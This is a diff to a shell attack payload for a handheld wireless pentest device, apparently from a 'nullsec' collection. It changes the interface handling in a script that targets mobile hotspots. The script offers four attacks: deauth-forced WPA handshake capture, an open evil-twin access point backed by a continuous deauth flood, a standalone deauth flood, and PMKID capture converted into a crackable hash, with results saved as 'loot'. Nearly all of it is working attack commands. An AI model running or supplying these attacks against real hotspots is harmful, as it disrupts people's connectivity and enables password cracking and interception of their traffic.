@@ -4,6 +4,11 @@
 # Description: Target mobile hotspots specifically
 # Category: nullsec/attack
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 LOOT_DIR="/mmc/nullsec/hotspots"
 mkdir -p "$LOOT_DIR"
 
@@ -18,10 +23,8 @@ connected devices.
 
 Press OK to configure."
 
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
-
 SPINNER_START "Scanning for hotspots..."
-timeout 15 airodump-ng wlan0 --write-interval 1 -w /tmp/hotscan --output-format csv 2>/dev/null
+timeout 15 airodump-ng $IFACE --write-interval 1 -w /tmp/hotscan --output-format csv 2>/dev/null
 SPINNER_STOP
 
 # Find likely hotspots (common naming patterns)
@@ -81,18 +84,18 @@ Attack: $ATTACK
 Press OK to begin.")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
-iwconfig wlan0 channel $CHANNEL
+iwconfig $IFACE channel $CHANNEL
 CAP_FILE="$LOOT_DIR/hotspot_${SSID}_$(date +%Y%m%d_%H%M)"
 
 case $ATTACK in
     1) # Handshake
         LOG "Capturing handshake..."
-        airodump-ng wlan0 --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
+        airodump-ng $IFACE --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
         CAP_PID=$!
         sleep 3
         
         for i in 1 2 3; do
-            aireplay-ng -0 5 -a "$BSSID" wlan0 2>/dev/null
+            aireplay-ng -0 5 -a "$BSSID" $IFACE 2>/dev/null
             sleep 8
             if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                 break
@@ -118,7 +121,7 @@ Try again."
     2) # Evil twin
         LOG "Starting evil twin..."
         cat > /tmp/twin.conf << EOF
-interface=wlan0
+interface=$IFACE
 ssid=$SSID
 channel=$CHANNEL
 hw_mode=g
@@ -126,7 +129,7 @@ auth_algs=1
 wpa=0
 EOF
         hostapd /tmp/twin.conf &
-        aireplay-ng -0 0 -a "$BSSID" wlan0 &
+        aireplay-ng -0 0 -a "$BSSID" $IFACE &
         
         PROMPT "EVIL TWIN ACTIVE
 
@@ -137,7 +140,7 @@ Press OK to stop."
         ;;
     3) # Deauth
         LOG "Deauthing hotspot..."
-        aireplay-ng -0 0 -a "$BSSID" wlan0 &
+        aireplay-ng -0 0 -a "$BSSID" $IFACE &
         
         PROMPT "DEAUTH ACTIVE
 
@@ -148,7 +151,7 @@ Press OK to stop."
         ;;
     4) # PMKID
         LOG "Capturing PMKID..."
-        timeout 30 hcxdumptool -i wlan0 -o "$CAP_FILE.pcapng" --filterlist_ap="$BSSID" --filtermode=2 2>/dev/null
+        timeout 30 hcxdumptool -i $IFACE -o "$CAP_FILE.pcapng" --filterlist_ap="$BSSID" --filtermode=2 2>/dev/null
         
         if [ -f "$CAP_FILE.pcapng" ]; then
             hcxpcapngtool -o "$CAP_FILE.hash" "$CAP_FILE.pcapng" 2>/dev/null
